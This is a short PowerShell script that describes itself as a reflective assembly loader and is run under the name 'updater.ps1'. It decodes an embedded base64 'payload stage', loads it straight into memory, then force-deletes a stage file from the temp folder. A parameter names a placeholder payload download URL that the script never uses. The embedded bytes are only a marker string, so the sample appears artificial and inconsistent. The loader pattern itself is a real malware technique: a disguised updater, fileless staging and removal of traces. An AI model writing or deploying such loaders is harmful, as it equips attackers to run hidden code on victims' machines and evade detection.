<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://adatum.com/payload.bin",
    [int]$TimeoutSec = 156
)
$ErrorActionPreference = "Stop"

try {
    $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo3aHR5Z242YXBo')
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $OperationResult = [Reflection.Assembly]::Load($ManagedBytes)
    if ($null -ne $OperationResult) {
        Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Write-Output "stage 21 initialized"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Set-Location -Path $env:TEMP
